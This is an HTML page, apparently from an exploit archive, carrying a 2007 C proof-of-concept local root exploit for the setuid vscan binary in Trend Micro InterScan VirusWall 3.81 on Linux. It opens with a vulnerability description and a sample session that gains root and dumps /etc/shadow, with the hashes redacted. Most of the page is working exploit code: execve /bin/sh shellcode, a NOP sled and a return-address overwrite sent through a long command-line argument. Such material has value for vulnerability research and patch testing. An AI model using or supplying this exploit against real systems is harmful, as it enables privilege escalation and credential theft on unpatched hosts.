<html><head><title>Trend Micro VirusWall 3.81 (vscan/VSAPI) Local Buffer Overflow Exploit</title></head><pre>/*

    Title: Local root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)

    Author: Sebastian Wolfgarten / sebastian@wolfgarten.com / http://www.devtarget.org

    Date: January 3rd, 2007

    Severity: Medium

    Description:

    The product &quot;InterScan VirusWall 3.81 for Linux&quot; ships a library called 
    &quot;libvsapi.so&quot; which is vulnerable to a memory corruption vulnerability.

    One of the applications that apparently uses this library is called &quot;vscan&quot;
    which is set suid root by default. It was discovered that this supporting
    program is prone to a classic buffer overflow vulnerability when a particularly
    long command-line argument is being passed and the application utilizes the flawed
    library to attempt to copy that data into a finite buffer. 

    As vscan is set suid root, this leads to arbitrary code execution with root level
    privileges. However the severity of this vulnerability is probably &quot;medium&quot; as by default
    the vscan file is only executable by the root user as well as members of the &quot;iscan&quot;
    group which is created during the installation of the software.

    Example:

    sebastian@debian31:~$ ./tmvwall381v3_exp

    Local root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)
    Author: Sebastian Wolfgarten, &lt;sebastian@wolfgarten.com&gt;
    Date: January 3rd, 2007

    Okay, /opt/trend/ISBASE/IScan.BASE/vscan is executable and by the way, your current user id is 5002.

    Executing /opt/trend/ISBASE/IScan.BASE/vscan. Afterwards check your privilege level with id or whoami!
    Virus Scanner v3.1, VSAPI v8.310-1002
    Trend Micro Inc. 1996,1997
        Pattern number 4.155.00

    sh-2.05b# id
    uid=5002(sebastian) gid=100(users) euid=0(root) groups=100(users),5001(iscan)

    sh-2.05b# cat /etc/shadow

    root:***REMOVED***:13372:0:99999:7:::
    daemon:*:13372:0:99999:7:::
    bin:*:13372:0:99999:7:::
    sys:*:13372:0:99999:7:::
    sync:*:13372:0:99999:7:::
    games:*:13372:0:99999:7:::
    man:*:13372:0:99999:7:::
    lp:*:13372:0:99999:7:::
    mail:*:13372:0:99999:7:::
    news:*:13372:0:99999:7:::
    uucp:*:13372:0:99999:7:::
    proxy:*:13372:0:99999:7:::
    www-data:*:13372:0:99999:7:::
    backup:*:13372:0:99999:7:::
    list:*:13372:0:99999:7:::
    irc:*:13372:0:99999:7:::
    gnats:*:13372:0:99999:7:::
    nobody:*:13372:0:99999:7:::
    Debian-exim:!:13372:0:99999:7:::
    sshd:!:13372:0:99999:7:::
    postfix:!:13500:0:99999:7:::
    mysql:!:13500:0:99999:7:::
    vmail:!:13500:0:99999:7:::
    amavis:!:13500:0:99999:7:::
    iscan:!:13500:0:99999:7:::
    sebastian:***REMOVED***:13500:0:99999:7:::

    Credits:

    Must go to Aleph One for the shellcode and mercy for bits of the code.

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define NOP 0x90
#define vscan &quot;/opt/trend/ISBASE/IScan.BASE/vscan&quot;

// Shellcode by Aleph One
char shellcode[] = &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot; 
		   &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot; 
                   &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

unsigned long get_sp(void) {

    __asm__(&quot;movl %esp, %eax&quot;);

}

int main(int argc, char *argv[], char **envp) {

    // Size of the vulnerable buffer (1116 + 4 bytes to overwrite EIP)
    int buff = 1120;

    // Address of the shellcode
    unsigned long addr;

    // Temporarily used to add nops etc.
    char *ptr;

    printf(&quot;\nLocal root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)\n&quot;);
    printf(&quot;Author: Sebastian Wolfgarten, &lt;sebastian@wolfgarten.com&gt;\n&quot;);
    printf(&quot;Date: January 3rd, 2007\n\n&quot;);

    // Check permissions on vscan executable, if this fails exploitation is infeasible.
    if (access(vscan, 01) != -1) {

        printf(&quot;Okay, %s is executable and by the way, your current user id is %d.\n&quot;,vscan,getuid());

	// Allocate memory for filling the buffer
        if((ptr = (char *)malloc(buff)) == NULL) {

		printf(&quot;Error allocating memory!\n&quot;);
		exit(-1);

	}

	// Determine the address of the shellcode with the inline assembly above
        addr = get_sp();

        // Add the NOP's to the buffer
        memset(ptr, NOP, buff);

        // Add the shellcode
        memcpy(ptr + buff - strlen(shellcode) - 8, shellcode, strlen(shellcode));

        // The return address
        *(long *)&amp;ptr[buff - 4] = addr;

        // Off we go, execute the vulnerable program
        printf(&quot;\nExecuting %s. Afterwards check your privilege level with id or whoami!\n&quot;,vscan);
        execl(vscan, &quot;vscan&quot;, ptr, NULL);

    } else {

        printf(&quot;Exploit failed. You seem not to have enough privileges to execute %s, sorry.\n&quot;,vscan);
	printf(&quot;Hint: Ask your local admin to add yourself to the iscan group or let him make the vscan binary world-executable.\n&quot;);
	printf(&quot;Then try again :-)\n\n&quot;);
	exit(1);

    }

    return 0;

}

// milw0rm.com [2007-01-28]</pre></html>